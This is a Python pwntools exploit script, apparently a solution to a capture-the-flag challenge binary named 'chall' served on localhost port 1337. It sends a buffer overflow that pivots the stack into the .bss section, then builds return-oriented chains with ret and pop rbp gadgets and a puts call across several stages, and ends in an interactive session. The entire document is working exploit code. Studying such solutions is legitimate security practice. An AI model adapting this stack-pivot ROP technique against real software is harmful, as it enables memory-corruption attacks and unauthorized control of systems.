#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chall", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc localhost 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pivot = elf.bss(0xa00)
ret = 0x4011c6
pop_rbp = 0x40115d

payload = b"A" * 0x20
payload += p64(pivot)
payload += p64(0x4011a0)
io.sendline(payload)

payload = b"A" * 0x20
payload += flat(
    pivot + 0x18,
    ret,
    elf.sym["puts"],
    pop_rbp,
    pivot - 0xe0,
)
payload += p64(ret) * 10
payload += p64(0x4011a0)
pause()
io.sendlineafter(b":)\n", payload)

payload = b"A" * 0x20
payload += flat(
    pivot - 0x80,
    0x4011a0,
    ret, ret, ret, ret,
    pop_rbp,
)
io.sendlineafter(b":)\n", payload)

io.interactive()
